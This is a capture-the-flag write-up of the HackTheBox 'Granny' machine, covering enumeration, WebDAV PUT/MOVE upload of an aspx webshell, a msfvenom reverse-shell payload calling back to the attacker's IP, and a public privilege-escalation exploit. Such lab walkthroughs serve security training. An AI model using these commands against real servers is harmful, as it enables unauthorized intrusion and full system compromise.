---
title: HTB -- Granny
date: 2022-01-30
layout: single
header:
  teaser: assets/images/htb/granny/teaser.png
excerpt: Granny is an older box which uses a webshell foothold via poorly configured iis and WebDAV. After user access is gained, the box can be rooted with a known CVE for said windows version. This box is fairly straightfoward and good for getting a handle on windows privesc methodology.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - web
  - windows
---

# Summary
<img src="/assets/images/htb/granny/teaser.png" width="80" height="80"/>
<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" width="80" height="80"/>

Granny is an older box which uses a webshell foothold via poorly configured iis and WebDAV. After user access is gained, the box can be rooted with a known CVE for said windows version. This box is fairly straightfoward and good for getting a handle on windows privesc methodology.

Webdav is obscure enough to worth detailing more here. There is a handy tool [davtest](https://github.com/cldrn/davtest) which can be used to streamline enumeration. Credit to [refabr1k](https://github.com/refabr1k/OSCP/blob/master/webdav.md) for the following examples.
```
# Davtest
# -------
# davtest detect vulnerability to upload
davtest -url http://1.1.1.1
# davtest uploading files
davtest -url http://target.com -uploadfile '/my/directory/file.html' -uploadloc exploit.html

# Direct Webdav commands
# ----------------------
# Copy a resource from one URI to another
COPY
# Put resource 
PUT
# Change and delete multiple properties on a resource in a single atomic act
PROPPATCH 
PROPFINDetrieve properties, stored as XML, from a web resource. It is also overloaded to allow one to retrieve the collection structure (a.k.a. directory hierarchy) of a remote system.
# Remove a lock from a resource
UNLOCK
# Put a lock on a resource. WebDAV supports both shared and exclusive locks.
LOCK 
#used to create collections (a.k.a. a directory)
MKCOL
```

## Recon
```
# Nmap 7.91 scan initiated Sat Jan  1 11:42:07 2022 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/HTB/granny/results/10.10.10.15/scans/_full_tcp_nmap.txt -oX /home/kali/HTB/granny/results/10.10.10.15/scans/xml/_full_tcp_nmap.xml 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.018s latency).
Scanned at 2022-01-01 11:42:07 EST for 115s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sat, 01 Jan 2022 16:50:40 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  1 11:44:02 2022 -- 1 IP address (1 host up) scanned in 115.28 seconds
```
Nice and simple web server, the section for http-methods allowed is absolutely a red flag. Most web servers will have GET and an occasional POST, but this vast array of methods raises several questions.
```
Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
```

## Web

Starting with a web brute force. It's important to note that iis has it's own set of specific files so brute forcing should typically be adjusted to an iis specific wordlist, such as [hacktricks compiled version](https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services) , [Seclists version](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt) or your own. [Here is one I put together over time](https://gist.github.com/Kontari/fc41ab6c7c5fea2b54937cc61f6d88e4).
```
feroxbuster -u http://granny.htb -x txt php js                                     

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://granny.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [txt, php, js]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        2l       10w      148c http://granny.htb/images
301        2l       10w      157c http://granny.htb/aspnet_client
301        2l       10w      152c http://granny.htb/_private
301        2l       10w      154c http://granny.htb/_vti_log
301        2l       10w      154c http://granny.htb/_vti_bin
301        2l       10w      148c http://granny.htb/Images
301        2l       10w      148c http://granny.htb/IMAGES
301        2l       10w      157c http://granny.htb/Aspnet_client
301        2l       10w      152c http://granny.htb/_Private
301        2l       10w      157c http://granny.htb/aspnet_Client
301        2l       10w      157c http://granny.htb/ASPNET_CLIENT
301        2l       10w      152c http://granny.htb/_PRIVATE
301        2l       10w      154c http://granny.htb/_VTI_LOG
[####################] - 2m    480016/480016  0s      found:13      errors:277    
[####################] - 2m    120004/120004  744/s   http://granny.htb
[####################] - 2m    120004/120004  753/s   http://granny.htb/images
[####################] - 2m    120004/120004  749/s   http://granny.htb/Images
[####################] - 2m    120004/120004  768/s   http://granny.htb/IMAGES

```

Next we will do a subdomain brute force. It's worth getting out of the way to we can know if anything else needs to be brute forced.
```
ffuf -w ~/HTB/subdomains-top1million-110000.txt -u http://10.10.10.15 -H "Host: FUZZ.granny.htb" | grep -v '200'        130 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.15
 :: Wordlist         : FUZZ: /home/kali/HTB/horizontal/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.granny.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1790 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
```
``
Nothing weird from our subdomain search and brute force. Looks to be an IIS server that is still being set up.
![](/assets/images/htb/granny/iis.png)

Nmap told us the version was `Microsoft-IIS/6.0` -- lets see what its vulnerable to
```
searchsploit iis 6.0
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                           | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                    | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                      | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                               | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                     | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                   | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                    | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                            | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                   | windows/remote/19033.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
```

Options

* 41738.py -- launches a calculator program, needs new shellcode
* 8765.php
  * `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.15 LPORT=4444 -f asp > shell.asp`
  * `php -f 8765.php shell.asp granny.htb /images/readme.asp`
  * Not working
* 8806.pl
    * `perl 8806.pl granny.htb images/`
    * Unauthorized to upload to the images dir
    * `perl 8806.pl granny.htb /`
      * `This place is ok though!`
      * put shell.txt

![](/assets/images/htb/granny/shellput.png)
Uploaded some code, now its time to figure out how to turn that capability into a reverse shell. Remember all those allowed http parameters? Nows the time to use them. MOVE is allowed so we can copy the file to a webshell type (as we cant direcictly upload an aspx)
```
curl -X MOVE -H 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/win.txt
```

Webshell access!
```
User accounts for \\GRANNY

-------------------------------------------------------------------------------
Administrator            ASPNET                   Guest                    
IUSR_GRANPA              IWAM_GRANPA              Lakis                    
SUPPORT_388945a0         
The command completed successfully.
```

Should be able to do the same but change the webshell payload to a reverse shell
```
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -o shell.aspx

perl 8806.pl granny.htb /                                                                                                          127 ⨯
write 'help' for get help list
$> put
[*] Insert a local file (ex: /root/file.txt): shell.aspx
HTTP/1.1 201 Created
Connection: close
Date: Sat, 01 Jan 2022 18:24:08 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Location: http://granny.htb/act.txt
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK

curl -X MOVE -H 'Destination:http://10.10.10.15/shell2.aspx' http://10.10.10.15/act.txt
curl http://10.10.10.15/shell2.aspx 
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.15] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```
We are on the box!

## Privesc

systeminfo gives us a better picture of this *very* old machine.
```
Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 36 Minutes, 35 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 745 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,290 MB
Page File: In Use:         180 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
``

If there is one thing old machines are good at, it's being vulnerable to CVEs. Searchscploit for the windows version gives us a plethora of options.

* [MS11-046 - Ancillary Function Driver](https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046)
  * Not working
* [Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation](https://www.exploit-db.com/exploits/6705)
  * Works!
  * nt/system

